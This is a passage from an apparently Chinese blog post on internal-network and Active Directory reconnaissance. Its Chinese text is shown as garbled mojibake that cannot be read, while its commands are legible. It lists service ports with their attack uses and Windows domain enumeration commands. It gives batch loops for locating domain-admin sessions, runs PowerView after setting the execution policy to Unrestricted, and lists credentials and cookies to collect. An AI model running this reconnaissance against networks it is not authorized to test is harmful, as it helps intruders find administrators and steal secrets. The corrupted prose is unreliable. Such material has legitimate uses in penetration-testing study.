åè®®</td><td>çˆ†ç ´ã€å—…æ¢</td></tr><tr><td>143</td><td>IMAP åè®®</td><td>çˆ†ç ´</td></tr></tbody></table><ul><li>ç½‘ç»œå¸¸è§åè®®ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>53</td><td>DNS åŸŸåç³»ç»Ÿ</td><td>å…è®¸åŒºåŸŸä¼ é€ã€DNS åŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td></tr><tr><td>67ã€68</td><td>DHCP æœåŠ¡</td><td>åŠ«æŒã€æ¬ºéª—</td></tr><tr><td>161</td><td>SNMP åè®®</td><td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td></tr></tbody></table><ul><li>ç‰¹æ®ŠæœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeper æœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>8069</td><td>Zabbix æœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œã€SQL æ³¨å…¥</td></tr><tr><td>9200ã€9300</td><td>Elasticsearch æœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>11211</td><td>Memcached æœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>512ã€513ã€514</td><td>Linux rexec æœåŠ¡</td><td>çˆ†ç ´ã€è¿œç¨‹ç™»é™†</td></tr><tr><td>873</td><td>rsync æœåŠ¡</td><td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td>3690</td><td>SVN æœåŠ¡</td><td>SVN æ³„éœ²ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr></tbody></table><h3 id="æ”¶é›†åŸŸå†…åŸºæœ¬ä¿¡æ¯"><a href="#æ”¶é›†åŸŸå†…åŸºæœ¬ä¿¡æ¯" class="headerlink" title="æ”¶é›†åŸŸå†…åŸºæœ¬ä¿¡æ¯"></a>æ”¶é›†åŸŸå†…åŸºæœ¬ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view /domain  # æŸ¥è¯¢åŸŸ</span><br><span class="line">net view /domain:HACKE  # æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº</span><br><span class="line">net group /domain  # æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨</span><br><span class="line">net group &quot;domain computers&quot; /domain  # æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨</span><br><span class="line">net accounts /domain  # è·å–åŸŸå¯†ç ä¿¡æ¯ï¼ˆåŸŸå¯†ç ç­–ç•¥ã€å¯†ç é•¿åº¦ã€é”™è¯¯é”å®šç­‰</span><br><span class="line">nltest /domain_trusts  # è·å–åŸŸä¿¡ä»»ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨"><a href="#æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨" class="headerlink" title="æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨"></a>æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:hacke  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨å</span><br><span class="line">nslookup -type=SRV _ldap._tcp  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå</span><br><span class="line">net time /domain  # æŸ¥çœ‹å½“å‰æ—¶é—´</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ä¸€èˆ¬ä¸€ä¸ªåŸŸä¸­ä¼šå­˜åœ¨å¤šä¸ªåŸŸæ§åˆ¶å™¨ï¼Œå¦‚æœä¸»æ§åˆ¶å™¨æ•…éšœåˆ™å¯ä»¥ä¿è¯æ­£å¸¸å·¥ä½œ</span></span></span><br><span class="line">netdom query pdc  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ï¼ˆä¸»æ§</span><br></pre></td></tr></table></figure><h3 id="è·å–åŸŸå†…ç”¨æˆ·åŠç®¡ç†å‘˜ä¿¡æ¯"><a href="#è·å–åŸŸå†…ç”¨æˆ·åŠç®¡ç†å‘˜ä¿¡æ¯" class="headerlink" title="è·å–åŸŸå†…ç”¨æˆ·åŠç®¡ç†å‘˜ä¿¡æ¯"></a>è·å–åŸŸå†…ç”¨æˆ·åŠç®¡ç†å‘˜ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨</span></span><br><span class="line">net user /domain  # å‘åŸŸæ§åˆ¶å™¨è¿›è¡ŒæŸ¥è¯¢</span><br><span class="line">wmic useraccount get /all  # è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br><span class="line">dsquery user  # æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·ï¼ˆåº”è¯¥æ˜¯åŸŸæ§æ‰æœ‰</span><br><span class="line">net localgroup administrators  # æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</span></span><br><span class="line">net group &quot;domain admins&quot; /domain  # æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain  # æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨ dsquery å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer  # æŸ¥æ‰¾ç›®å½•ä¸­çš„è®¡ç®—æœº</span><br><span class="line">dsquery contact  # æŸ¥æ‰¾ç›®å½•ä¸­çš„è”ç³»äºº</span><br><span class="line">dsquery subnet  # æŸ¥æ‰¾ç›®å½•ä¸­çš„å­ç½‘</span><br><span class="line">dsquery group  # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„</span><br><span class="line">dsquery ou  # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ç»‡å•ä½</span><br><span class="line">dsquery site  # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç«™ç‚¹</span><br><span class="line">dsquery server  # æŸ¥æ‰¾ç›®å½•ä¸­çš„ AD DC/LDS å®ä¾‹</span><br><span class="line">dsquery user  # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ·</span><br><span class="line">dsquery quota  # æŸ¥æ‰¾ç›®å½•ä¸­çš„é…é¢è§„å®š</span><br><span class="line">dsquery partition  # æŸ¥æ‰¾ç›®å½•ä¸­çš„åˆ†åŒº</span><br><span class="line">dsquery *  # ç”¨é€šç”¨çš„ LDAP æŸ¥è¯¢æ¥æŸ¥æ‰¾ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡</span><br></pre></td></tr></table></figure><h3 id="å®šä½åŸŸç®¡ç†å‘˜"><a href="#å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="å®šä½åŸŸç®¡ç†å‘˜"></a>å®šä½åŸŸç®¡ç†å‘˜</h3><p>å®šä½åŸŸç®¡ç†å‘˜çš„å¸¸è§„æ¸ é“ï¼Œä¸€æ˜¯æ—¥å¿—ï¼ŒäºŒæ˜¯ä¼šè¯ï¼Œæ—¥å¿—æ˜¯æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬æˆ– Wevutil å·¥å…·å¯¼å‡ºå¹¶æŸ¥çœ‹ï¼Œä¼šè¯æ˜¯æŒ‡åŸŸå†…æ¯å°æœºå™¨çš„ç™»å½•ä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨ netsess.exe æˆ– PowerView.exe ç­‰å·¥å…·æŸ¥è¯¢ï¼ˆå¯ä»¥åŒ¿åæŸ¥è¯¢ï¼Œä¸éœ€è¦æƒé™ï¼‰</p><ul><li>psloggedon.exeï¼š<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></li><li>PVEFindADUser.exeï¼š<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></li><li>netview.exeï¼š<a href="https://github.com/mubix/netview">GitHub - mubix/netview: Netview enumerates systems using WinAPI calls</a></li><li>Nmap çš„ NSE è„šæœ¬ï¼š<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></li><li>PowerView è„šæœ¬ï¼š<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></li><li>Empire çš„ user_hunter æ¨¡å—</li></ul><h3 id="æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"><a href="#æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹" class="headerlink" title="æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"></a>æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. æœ¬æœºæ£€æŸ¥</span></span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</span><br><span class="line">tasklist /v  # åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·ï¼Œå¯»æ‰¾è¿›ç¨‹æ‰€æœ‰è€…ä¸ºåŸŸç®¡ç†å‘˜çš„è¿›ç¨‹</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åŸç†ï¼šåœ¨åŸŸæ§åˆ¶å™¨ä¸­æŸ¥è¯¢åŸŸç”¨æˆ·ä¼šè¯åˆ—è¡¨ï¼Œå¹¶å°†å…¶ä¸åŸŸç®¡ç†å‘˜åˆ—è¡¨è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œä»è€Œå¾—åˆ°åŸŸç®¡ç†ä¼šè¯çš„ç³»ç»Ÿåˆ—è¡¨</span></span></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # æŸ¥è¯¢åŸŸæ§åˆ¶å™¨åˆ—è¡¨</span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨</span><br><span class="line">NetSess -h  # åˆ©ç”¨ NetSess.exe æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## å°†åŸŸæ§åˆ¶å™¨åˆ—è¡¨æ·»åŠ åˆ° dcs.txt ä¸­ï¼Œå°†åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ° admins.txt ä¸­ï¼Œå¹¶äº NetSess.exe NetSess.exe æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¿è¡Œä¸‹é¢è„šæœ¬</span></span></span><br><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## ä¹Ÿå¯ä»¥åˆ©ç”¨ Get Domain Adminsï¼ˆGDAï¼‰æ‰¹å¤„ç†è„šæœ¬ï¼šhttps://github.com/nullbind/Other-Projects/tree/master/GDA</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># é¦–å…ˆä» Domain Admins ç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨ï¼Œå°†ç›®æ ‡åŸŸç³»ç»Ÿåˆ—è¡¨æ·»åŠ åˆ° ips.txt æ–‡ä»¶ä¸­ï¼Œå°†æ”¶é›†çš„åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ° names.txt æ–‡ä»¶ä¸­ï¼Œè¿è¡Œä¸‹é¢è„šæœ¬</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] %u &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n&gt;NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. æ‰«æè¿œç¨‹ç³»ç»Ÿçš„ NetBIOS ä¿¡æ¯</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># é¦–å…ˆä» Domain Admins ç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨ï¼Œå°†ç›®æ ‡åŸŸç³»ç»Ÿåˆ—è¡¨æ·»åŠ åˆ° ips.txt æ–‡ä»¶ä¸­ï¼Œå°†æ”¶é›†çš„åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ° admins.txt æ–‡ä»¶ä¸­ï¼Œè¿è¡Œä¸‹é¢è„šæœ¬</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n&gt;NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h3 id="PowerShell-æ”¶é›†ä¿¡æ¯"><a href="#PowerShell-æ”¶é›†ä¿¡æ¯" class="headerlink" title="PowerShell æ”¶é›†ä¿¡æ¯"></a>PowerShell æ”¶é›†ä¿¡æ¯</h3><p>PowerShell å¸¸ç”¨æ‰§è¡Œæƒé™ï¼š</p><ul><li>Resrictedï¼šé»˜è®¤è®¾ç½®ï¼Œä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬</li><li>Allsignedï¼šåªèƒ½è¿è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬</li><li>Unrestrictedï¼šæƒé™æœ€é«˜ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„è„šæœ¬</li><li>RemoteSignedï¼šå¯¹æœ¬åœ°è„šæœ¬ä¸è¿›è¡Œé™åˆ¶ï¼Œå¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»éªŒè¯å…¶ç­¾å</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span>  <span class="comment"># æŸ¥çœ‹æ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="comment"># ä¿®æ”¹æ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="built_in">Import-Module</span> ./PowerView.ps1  <span class="comment"># å¯¼å…¥ä¸‹è½½çš„ PowerView è„šæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView å¸¸ç”¨å‘½ä»¤</span></span><br><span class="line"><span class="built_in">Get-NetDomain</span>  <span class="comment"># è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°</span></span><br><span class="line"><span class="built_in">Get-NetUser</span>  <span class="comment"># è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetDomainController</span>  <span class="comment"># è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span>  <span class="comment"># è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetOU</span>  <span class="comment"># è·å–åŸŸå†…çš„ OU ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetGroup</span>  <span class="comment"># è·å–åŸŸå†…ç»„å’Œç»„æˆå‘˜çš„ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetFileServer</span>  <span class="comment"># æ ¹æ® SPN è·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetShare</span>  <span class="comment"># è·å–å½“å‰åŸŸå†…çš„æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">Get-NetSession</span>  <span class="comment"># è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯</span></span><br><span class="line"><span class="built_in">Get-NetRDPSession</span>  <span class="comment"># è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥</span></span><br><span class="line"><span class="built_in">Get-NetProcess</span>  <span class="comment"># è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">Get-UserEvent</span>  <span class="comment"># è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—</span></span><br><span class="line"><span class="built_in">Get-ADObject</span>  <span class="comment"># è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡</span></span><br><span class="line"><span class="built_in">Get-NetGPO</span>  <span class="comment"># è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡</span></span><br><span class="line"><span class="built_in">Get-DomainPolicy</span>  <span class="comment"># è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥</span></span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>  <span class="comment"># è·å–åŸŸç”¨æˆ·ç™»é™†çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™</span></span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>  <span class="comment"># é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·</span></span><br><span class="line"><span class="built_in">Invoke-UserEventHunter</span>  <span class="comment"># æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»é™†è¿‡å“ªäº›åŸŸæœºå™¨</span></span><br></pre></td></tr></table></figure><h3 id="åŸŸåˆ†æå·¥å…·-BloodHound"><a href="#åŸŸåˆ†æå·¥å…·-BloodHound" class="headerlink" title="åŸŸåˆ†æå·¥å…· BloodHound"></a>åŸŸåˆ†æå·¥å…· BloodHound</h3><p><a href="https://github.com/BloodHoundAD/BloodHound/releases/">https://github.com/BloodHoundAD/BloodHound/releases/</a></p><h3 id="æ•æ„Ÿæ•°æ®é˜²æŠ¤"><a href="#æ•æ„Ÿæ•°æ®é˜²æŠ¤" class="headerlink" title="æ•æ„Ÿæ•°æ®é˜²æŠ¤"></a>æ•æ„Ÿæ•°æ®é˜²æŠ¤</h3><h4 id="èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹"><a href="#èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹" class="headerlink" title="èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹"></a>èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹</h4><ul><li>å®šä½å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„</li><li>åœ¨å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„ä¸­å¯»æ‰¾éœ€è¦ç›‘è§†çš„äººå‘˜</li><li>å®šä½ç›¸å…³äººå‘˜çš„æœºå™¨</li><li>ç›‘è§†ç›¸å…³äººå‘˜å­˜æ”¾æ–‡æ¡£çš„ä½ç½®</li><li>åˆ—å‡ºå­˜æ”¾æ–‡æ¡£çš„æœåŠ¡å™¨çš„ç›®å½•</li></ul><h4 id="é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤"><a href="#é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤" class="headerlink" title="é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤"></a>é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤</h4><h5 id="æ ¸å¿ƒä¸šåŠ¡æœºå™¨"><a href="#æ ¸å¿ƒä¸šåŠ¡æœºå™¨" class="headerlink" title="æ ¸å¿ƒä¸šåŠ¡æœºå™¨"></a>æ ¸å¿ƒä¸šåŠ¡æœºå™¨</h5><ul><li>é«˜çº§ç®¡ç†äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜ã€è´¢åŠ¡/äººäº‹/ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœº</li><li>äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨</li><li>åŠå…¬ç³»ç»ŸæœåŠ¡å™¨</li><li>è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨</li><li>æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨ï¼ˆIT å…¬å¸é€šå¸¸ä¼šæ¶è®¾è‡ªå·±çš„ SVN æˆ–è€… GIT æœåŠ¡å™¨ï¼‰</li><li>æ•°æ®åº“æœåŠ¡å™¨</li><li>æ–‡ä»¶æœåŠ¡å™¨ã€å…±äº«æœåŠ¡å™¨</li><li>ç”µå­é‚®ä»¶æœåŠ¡å™¨</li><li>ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨</li><li>å…¶ä»–æœåŠ¡å™¨ï¼ˆåˆ†å…¬å¸ã€å·¥å‚ï¼‰</li></ul><h5 id="æ•æ„Ÿä¿¡æ¯å’Œæ•æ„Ÿæ–‡ä»¶"><a href="#æ•æ„Ÿä¿¡æ¯å’Œæ•æ„Ÿæ–‡ä»¶" class="headerlink" title="æ•æ„Ÿä¿¡æ¯å’Œæ•æ„Ÿæ–‡ä»¶"></a>æ•æ„Ÿä¿¡æ¯å’Œæ•æ„Ÿæ–‡ä»¶</h5><ul><li>ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰</li><li>å„ç±»æ•°æ®åº“çš„ Web ç®¡ç†å…¥å£ï¼Œä¾‹å¦‚ phpMyAdminã€Adminer</li><li>æµè§ˆå™¨å¯†ç å’Œæµè§ˆå™¨ Cookie</li><li>å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389 å’Œ ipc$ è¿æ¥è®°å½•ã€â€œå›æ”¶ç«™â€ä¸­çš„ä¿¡æ¯ç­‰</li><li>Windows æ— çº¿å¯†ç </li><li>ç½‘ç»œå†…éƒ¨çš„å„ç§è´¦å·å’Œå¯†ç ï¼ŒåŒ…æ‹¬ç”µå­é‚®ç®±ã€VPNã€FTPã€TeamViewç­‰</li></ul><h4 id="åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤"><a href="#åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤" class="headerlink" title="åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤"></a>åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤</h4><p>åº”ç”¨é…ç½®æ–‡ä»¶ã€æ•æ„Ÿæ–‡ä»¶ã€å¯†ç ã€è¿œç¨‹è¿æ¥ã€å‘˜å·¥è´¦å·ã€ç”µå­é‚®ç®±ç­‰</p><h3 id="åˆ†æåŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„"><a href="#åˆ†æåŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„" class="headerlink" title="åˆ†æåŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„"></a>åˆ†æåŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„</h3><h4 id="åŸºæœ¬æ¶æ„"><a href="#åŸºæœ¬æ¶æ„" class="headerlink" title="åŸºæœ¬æ¶æ„"></a>åŸºæœ¬æ¶æ„</h4><p>å¸¸è§çš„ Web æ¶æ„</p><ul><li>ASP + Access + IIS 5.0/6.0 + Windows Server 2003</li><li>ASPX + MSSQL + IIS 7.0/7.5 + Windows Server 2008</li><li>PHP + MySQL + IIS</li><li>PHP + MySQL + Apache</li><li>PHP + MySQL + Nginx</li><li>JSP + MySQL + Nginx</li><li>JSP + MSSQL + Tomcat</li><li>JSP + Oracle + Tomcat</li></ul><h4 id="åŸŸå†…ç½‘æ®µåˆ’åˆ†"><a href="#åŸŸå†…ç½‘æ®µåˆ’åˆ†" class="headerlink" title="åŸŸå†…ç½‘æ®µåˆ’åˆ†"></a>åŸŸå†…ç½‘æ®µåˆ’åˆ†</h4><ul><li><p>DMZ</p></li><li><p>åŠå…¬åŒº</p><ul><li><p>ç³»ç»Ÿ</p><ul><li>OA ç³»ç»Ÿ</li><li>é‚®ä»¶ç³»ç»Ÿ</li><li>è´¢åŠ¡ç³»ç»Ÿ</li><li>æ–‡ä»¶å…±äº«ç³»ç»Ÿ</li><li>ä¼ä¸šç‰ˆæ€æ¯’ç³»ç»Ÿ</li><li>å†…éƒ¨åº”ç”¨ç›‘æ§ç³»ç»Ÿ</li><li>è¿ç»´ç®¡ç†ç³»ç»Ÿ</li></ul></li><li><p>ç½‘æ®µ</p><ul><li>åŸŸç®¡ç†ç½‘æ®µ</li><li>å†…éƒ¨æœåŠ¡å™¨ç³»ç»Ÿç½‘æ®µ</li><li>å„éƒ¨é—¨åˆ†åŒºç½‘æ®µ</li></ul></li></ul></li><li><p>æ 